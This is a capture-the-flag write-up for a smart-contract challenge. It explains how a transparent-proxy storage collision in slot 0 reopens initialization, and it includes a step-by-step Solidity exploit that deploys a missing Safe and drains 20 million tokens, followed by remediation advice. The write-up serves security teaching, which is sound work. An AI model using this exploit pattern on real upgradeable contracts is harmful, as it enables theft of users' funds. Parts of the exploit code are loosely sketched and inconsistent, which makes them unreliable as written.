# Challenge #14: Wallet Mining

- **Difficulty:** Hard
- **Category:** Proxy Storage Collision / Counterfactual Deployment
- **Severity:** Critical
- **Status:** SOLVED ✅

## Overview

A wallet mining system deploys Safe wallets to predictable addresses using a `WalletDeployer` contract. Users have 20 million DVT deposited at `USER_DEPOSIT_ADDRESS`, but the Safe was never deployed there. The deployer rewards whoever deploys the Safe with 1 DVT. An `AuthorizerUpgradeable` behind a `TransparentProxy` controls which addresses can deploy to which targets.

## Vulnerabilities

### Bug 1: Transparent Proxy Storage Collision

`TransparentUpgradeableProxy` stores its `upgrader` address in **storage slot 0**. The `AuthorizerUpgradeable` implementation uses slot 0 for `needsInit` (a boolean). This collision means:

```
Slot 0: TransparentProxy.upgrader = deployer address (non-zero)
     == AuthorizerUpgradeable.needsInit = true (non-zero = true)
```

Since `needsInit` appears true, anyone can call `init()` again — reopening initialization on a supposedly initialized contract.

### Bug 2: Wallet Deployment Reward

The system rewards the deployer with 1 DVT per deployed Safe. Combined with the ability to re-authorize, an attacker can deploy the missing Safe and execute a pre-signed transaction to rescue the 20M DVT.

## Exploit Walkthrough

```solidity
// Step 1: Compute the Safe initializer for user (1-of-1 Safe)
bytes memory initializer = abi.encodeCall(Safe.setup, (
    [user], 1,  // owner, threshold
    address(0), "",  // no delegatecall
    address(0), 0,   // no payment
    address(0)       // no fallback manager
));

// Step 2: Brute-force saltNonce until predicted address matches USER_DEPOSIT_ADDRESS
uint256 saltNonce;
for (saltNonce = 0; ; saltNonce++) {
    address predicted = deployer.predictProxyAddress(user, saltNonce);
    if (predicted == USER_DEPOSIT_ADDRESS) break;
}

// Step 3: Pre-sign a Safe transaction to transfer 20M DVT
bytes32 txHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash(
    token, 0, abi.encodeCall(token.transfer, (user, 20_000_000e18)),
    Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), 0
);
bytes memory signature = sign(userPrivateKey, txHash);

// Step 4: Deploy attacker contract and execute everything in one tx
contract WalletMiningAttacker {
    constructor(address authorizer, address deployer, address token,
                address depositAddress, address ward, address user, bytes memory sig) {
        // Re-init authorizer via storage collision
        AuthorizerUpgradeable(authorizer).init([address(this)], [depositAddress]);
        
        // Deploy Safe to target address
        WalletDeployer(deployer).drop(depositAddress, initializer, saltNonce);
        
        // Send bounty reward to ward
        payable(ward).transfer(1e18);
        
        // Execute pre-signed Safe transaction
        Safe(payable(depositAddress)).execTransaction(
            token, 0, transferData, Enum.Operation.Call,
            0, 0, 0, address(0), payable(address(0)), signature
        );
    }
}
```

## Real-World Impact

**Compound Comptroller** proxy storage collisions caused issues in early upgradeable contract designs. The **Ethernaut "Preservation"** challenge demonstrates the same principle: proxy storage layout mismatches allow attackers to corrupt admin state.

## Remediation

```solidity
// FIX 1: Use EIP-1967 storage layout
// Store proxy admin at: bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1)
// Store implementation at: bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)

// FIX 2: Reserve storage slots in implementation contracts
uint256[50] private __gap;  // Reserve 50 slots for future proxy storage

// FIX 3: Initialize with msg.sender check that persists
require(initialized != type(uint256).max, "Already initialized");
```

## Key Takeaway

> **Transparent proxies share storage with their implementation. Slot 0 collisions can reopen initialization, corrupt admin state, or enable arbitrary code execution. Always use EIP-1967 storage layout and reserve implementation slots with `__gap`.**
